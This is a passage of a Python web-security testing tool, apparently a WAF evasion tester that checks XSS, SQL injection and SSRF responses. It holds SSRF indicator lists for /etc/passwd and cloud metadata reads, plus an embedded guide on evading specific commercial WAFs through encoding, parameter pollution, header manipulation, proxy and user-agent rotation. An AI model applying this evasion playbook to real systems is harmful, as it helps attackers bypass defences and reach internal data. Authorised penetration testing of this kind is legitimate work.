            'sql': self._check_sql_false_positives,
            'ssrf': self._check_ssrf_false_positives
        }
        vuln_type = payload_data.get('type', '').lower()
        check_func = checks.get(vuln_type, lambda r, p: {})
        return check_func(response, payload_data)
    
    def _check_xss_false_positives(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for common XSS false positives"""
        payload = payload_data.get('payload', '')
        response_text = response.text
        
        # Check for absence of script tags
        if '<script>' not in response_text and 'onerror' not in response_text:
            return {'likely_false_positive': True, 'reason': 'No script tags or event handlers'}
        
        return {}
    
    def _check_sql_false_positives(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for common SQLi false positives"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # Check for absence of SQL error patterns
        sql_errors = [
            r'sql syntax.*mysql',
            r'warning.*mysql_',
            r'valid mysql result',
            r'postgresql.*error',
            r'warning.*pg_',
            r'valid postgresql result',
            r'oracle error',
            r'oracle.*driver',
            r'sqlserver.*error',
            r'microsoft.*odbc.*sql server',
            r'sqlite.*error',
            r'sqlite3.*operationalerror',
            r'unterminated quoted string',
            r'unexpected end of sql command',
            r'quoted string not properly terminated'
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text):
                return {}
        
        return {'likely_false_positive': True, 'reason': 'No SQL error patterns'}
    
    def _check_ssrf_false_positives(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for common SSRF false positives"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # Check for absence of internal IPs or sensitive data
        ssrf_indicators = [
            'root:x:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd
            'mysql', 'postgresql', 'redis',       # Internal services
            'apache', 'nginx', 'iis',             # Web servers
            'instance-id', 'ami-id',              # AWS metadata
            'metadata.google.internal',           # GCP metadata
            'localhost', '127.0.0.1', '::1'      # Localhost indicators
        ]
        
        for indicator in ssrf_indicators:
            if indicator in response_text:
                return {}
        
        return {'likely_false_positive': True, 'reason': 'No sensitive data or internal IPs'}
    
    def _check_direct_reflection(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for direct reflection of payload in response"""
        payload = payload_data.get('payload', '')
        response_text = response.text
        
        if payload in response_text:
            return {'detected': True, 'type': 'direct_reflection', 'weight': 1}
        return {'detected': False}
    
    def _check_encoded_reflection(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for encoded reflection (e.g., URL encoding)"""
        payload = payload_data.get('payload', '')
        response_text = response.text
        
        # URL decoding the response for analysis
        try:
            decoded_response = urllib.parse.unquote(response_text)
        except Exception:
            decoded_response = response_text
        
        if payload in decoded_response:
            return {'detected': True, 'type': 'encoded_reflection', 'weight': 1}
        return {'detected': False}
    
    def _check_behavioral_changes(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for behavioral changes (e.g., response time)"""
        # This is a stub for future implementation
        return {'detected': False}
    
    def _check_timing_anomalies(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for timing anomalies indicative of blind injections"""
        # This is a stub for future implementation
        return {'detected': False}
    
    def _check_error_disclosure(self, response: requests.Response, payload_data: dict) -> dict:
        """Check for error messages that disclose sensitive information"""
        payload = payload_data.get('payload', '')
        response_text = response.text.lower()
        
        # Common error messages to check for
        error_patterns = [
            r'you have an error in your sql syntax',
            r'warning: mysql',
            r'valid mysql result',
            r'postgresql.*error',
            r'warning.*pg_',
            r'valid postgresql result',
            r'oracle error',
            r'oracle.*driver',
            r'sqlserver.*error',
            r'microsoft.*odbc.*sql server',
            r'sqlite.*error',
            r'sqlite3.*operationalerror',
            r'quoted string not properly terminated'
        ]
        
        for pattern in error_patterns:
            if re.search(pattern, response_text):
                return {'detected': True, 'type': 'error_disclosure', 'weight': 1}
        
        return {'detected': False}

# WAF Detection and Contingency Documentation
WAF_CONTINGENCY_GUIDE = """
# WAF Detection and Evasion Contingencies

## What WAFs Detect
1. **Signature-based detection**: Known malicious patterns
2. **Behavioral analysis**: Abnormal request patterns
3. **Rate limiting**: Too many requests too quickly
4. **IP reputation**: Known malicious IPs
5. **User-Agent analysis**: Suspicious or missing user agents

## Detection Contingencies

### If WAF is Detected:
1. **Immediate Actions**:
   - Switch to evasion mode automatically
   - Reduce request rate by 50%
   - Rotate user agents and sessions
   - Use proxy rotation if available

2. **Evasion Strategy Selection**:
   - **Cloudflare**: Focus on encoding and case variations
   - **AWS WAF**: Use parameter pollution and header manipulation
   - **Akamai**: Employ whitespace and comment insertion
   - **Imperva**: Try protocol confusion and IP obfuscation

3. **Escalation Path**:
   - Start with subtle evasions (encoding)
   - Progress to structural changes (parameter pollution)
   - Finally attempt aggressive techniques (header manipulation)

### Risk Levels:

#### LOW RISK (Green):
- Standard payloads on unprotected endpoints
- Basic encoding evasion
- Request rate < 1 per 3 seconds

#### MEDIUM RISK (Yellow):
- WAF detected but evasion working
- Some requests blocked (< 20%)
- Request rate 1-2 per second

#### HIGH RISK (Red):
- High block rate (> 50%)
- IP getting flagged/blocked
- Aggressive payloads triggering alerts

### Abort Conditions:
1. **IP blocked** - Stop immediately, switch IP/proxy
2. **Rate limited** - Increase delays significantly
3. **Legal notices** - Abort testing entirely
4. **Account locked** (if testing authenticated) - Stop session

## Recommended Evasion Order:
1. URL encoding variations
2. Case manipulation
3. Whitespace insertion
4. Comment injection
5. Parameter pollution
6. Header manipulation
7. Protocol confusion (SSRF only)
8. Advanced encoding (Unicode, hex)

## Monitoring Indicators:
- Response status codes (403, 406, 429)
- Response time increases
- Challenge pages (CAPTCHA)
- Error messages containing WAF identifiers
- Session termination
"""

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Manual WAF Evasion Tester")
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--payload", required=True)
    parser.add_argument("--method", default="GET")
    parser.add_argument("--parameter", default="url")
    parser.add_argument("--mode", default="reflect")
    parser.add_argument("--output", default="waf_results.txt")
    args = parser.parse_args()

    tester = WAFEvasionTester()
    result = tester.test_payload_aggressive(
        args.base_url, 
        {
            "payload": args.payload,
            "parameter": args.parameter,
            "method": args.method,
            "type": "ssrf"
        }
    )

    with open(args.output, "w") as f:
        f.write(json.dumps(result, indent=2))

    print(f"Results saved to {args.output}")

